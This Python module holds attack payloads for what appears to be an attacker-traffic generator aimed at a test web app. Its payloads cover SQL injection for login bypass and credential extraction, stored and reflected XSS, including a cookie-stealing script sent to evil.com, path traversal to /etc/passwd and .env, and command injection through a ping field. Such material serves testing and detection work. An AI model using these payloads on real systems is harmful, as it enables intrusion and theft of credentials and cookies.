"""Attack payloads for the attacker traffic generator.

Organized by OWASP Top 10 attack category. Each payload includes
the attack string, target endpoint, and expected behavior.
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass
class Payload:
    """A single attack payload."""

    name: str
    category: str  # sqli, xss, traversal, cmdi, auth
    method: str  # GET or POST
    path: str
    params: dict[str, str] | None = None
    data: dict[str, str] | None = None
    description: str = ""


# ─── SQL Injection Payloads ───

SQLI_PAYLOADS = [
    Payload(
        name="sqli-basic-or",
        category="sqli",
        method="GET",
        path="/search",
        params={"q": "' OR 1=1 --"},
        description="Basic boolean-based SQLi to dump all products",
    ),
    Payload(
        name="sqli-union-users",
        category="sqli",
        method="GET",
        path="/search",
        params={"q": "' UNION SELECT id,username,password,email,role,NULL,NULL,NULL FROM users --"},
        description="UNION-based SQLi to extract user credentials",
    ),
    Payload(
        name="sqli-union-tables",
        category="sqli",
        method="GET",
        path="/search",
        params={"q": "' UNION SELECT 1,name,sql,4,5,6,7,8 FROM sqlite_master --"},
        description="Extract database schema via sqlite_master",
    ),
    Payload(
        name="sqli-login-bypass",
        category="sqli",
        method="POST",
        path="/login",
        data={"username": "admin' --", "password": "anything"},
        description="Authentication bypass via SQL injection",
    ),
    Payload(
        name="sqli-time-blind",
        category="sqli",
        method="GET",
        path="/search",
        params={"q": "' OR CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END --"},
        description="Blind SQL injection test",
    ),
]

# ─── XSS Payloads ───

XSS_PAYLOADS = [
    Payload(
        name="xss-reflected-script",
        category="xss",
        method="GET",
        path="/search",
        params={"q": "<script>alert('XSS')</script>"},
        description="Basic reflected XSS via script tag",
    ),
    Payload(
        name="xss-reflected-img",
        category="xss",
        method="GET",
        path="/search",
        params={"q": '<img src=x onerror=alert("XSS")>'},
        description="Reflected XSS via img onerror",
    ),
    Payload(
        name="xss-stored-review",
        category="xss",
        method="POST",
        path="/review",
        data={
            "product_id": "1",
            "author": "attacker",
            "content": '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
            "rating": "5",
        },
        description="Stored XSS via malicious review (cookie theft)",
    ),
    Payload(
        name="xss-reflected-svg",
        category="xss",
        method="GET",
        path="/search",
        params={"q": '<svg onload=alert("XSS")>'},
        description="Reflected XSS via SVG onload",
    ),
]

# ─── Path Traversal Payloads ───

TRAVERSAL_PAYLOADS = [
    Payload(
        name="traversal-etc-passwd",
        category="traversal",
        method="GET",
        path="/static/../../etc/passwd",
        description="Path traversal to read /etc/passwd",
    ),
    Payload(
        name="traversal-proc",
        category="traversal",
        method="GET",
        path="/static/../../../proc/self/environ",
        description="Path traversal to read process environment",
    ),
    Payload(
        name="traversal-app-config",
        category="traversal",
        method="GET",
        path="/static/../../.env",
        description="Path traversal to read application config",
    ),
]

# ─── Command Injection Payloads ───

CMDI_PAYLOADS = [
    Payload(
        name="cmdi-semicolon",
        category="cmdi",
        method="POST",
        path="/admin/ping",
        data={"host": "127.0.0.1; cat /etc/passwd"},
        description="Command injection via semicolon",
    ),
    Payload(
        name="cmdi-pipe",
        category="cmdi",
        method="POST",
        path="/admin/ping",
        data={"host": "127.0.0.1 | id"},
        description="Command injection via pipe",
    ),
    Payload(
        name="cmdi-backtick",
        category="cmdi",
        method="POST",
        path="/admin/ping",
        data={"host": "127.0.0.1 `whoami`"},
        description="Command injection via backtick",
    ),
]

# ─── All payloads combined ───

ALL_PAYLOADS = SQLI_PAYLOADS + XSS_PAYLOADS + TRAVERSAL_PAYLOADS + CMDI_PAYLOADS


def get_payloads_by_category(category: str) -> list[Payload]:
    """Get payloads filtered by category."""
    return [p for p in ALL_PAYLOADS if p.category == category]
